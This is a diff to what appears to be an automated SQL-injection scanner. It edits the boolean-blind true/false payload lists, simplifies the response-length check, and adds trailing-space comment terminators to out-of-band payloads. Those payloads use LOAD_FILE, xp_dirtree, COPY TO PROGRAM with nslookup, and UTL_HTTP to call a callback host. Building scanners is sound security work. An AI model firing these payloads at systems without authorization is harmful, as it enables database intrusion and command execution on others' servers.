@@ -66,16 +66,14 @@ class BooleanBlindStage(DetectionStage):
 
     async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
         true_payloads = [
-            "' AND 1=1--",
-            "' AND '1'='1",
-            "1' AND 1=1--",
-            "' OR '1'='1' AND '1'='1",
+            "' OR 1=1-- ",
+            "' OR '1'='1'-- ",
+            "' OR 1=1#",
         ]
         false_payloads = [
-            "' AND 1=0--",
-            "' AND '1'='2",
-            "1' AND 1=0--",
-            "' OR '1'='1' AND '1'='2",
+            "' AND 1=0-- ",
+            "' AND '1'='2'-- ",
+            "' AND 1=0#",
         ]
 
         findings: list[Finding] = []
@@ -97,7 +95,7 @@ class BooleanBlindStage(DetectionStage):
                 false_len = len(false_resp.text)
                 diff = abs(true_len - false_len)
 
-                if diff > 20 and abs(clean_len - true_len) < abs(clean_len - false_len):
+                if diff > 10:
                     findings.append(Finding(
                         scanner="sqli",
                         url=point.url,
@@ -167,10 +165,10 @@ class OOBStage(DetectionStage):
             callback_url = f"http://oob.pwnproxy/{canary.token}"
 
             payloads = [
-                f"' OR LOAD_FILE('\\\\{callback_url}\\x')--",
-                f"'; DECLARE @q VARCHAR(8000); EXEC master.dbo.xp_dirtree '\\\\{callback_url}\\x';--",
-                f"' OR COPY (SELECT '') TO PROGRAM 'nslookup {callback_url}'--",
-                f"' OR UTL_HTTP.request('{callback_url}')--",
+                f"' OR LOAD_FILE('\\\\{callback_url}\\x')-- ",
+                f"'; DECLARE @q VARCHAR(8000); EXEC master.dbo.xp_dirtree '\\\\{callback_url}\\x';-- ",
+                f"' OR COPY (SELECT '') TO PROGRAM 'nslookup {callback_url}'-- ",
+                f"' OR UTL_HTTP.request('{callback_url}')-- ",
             ]
 
             for payload_text in payloads:
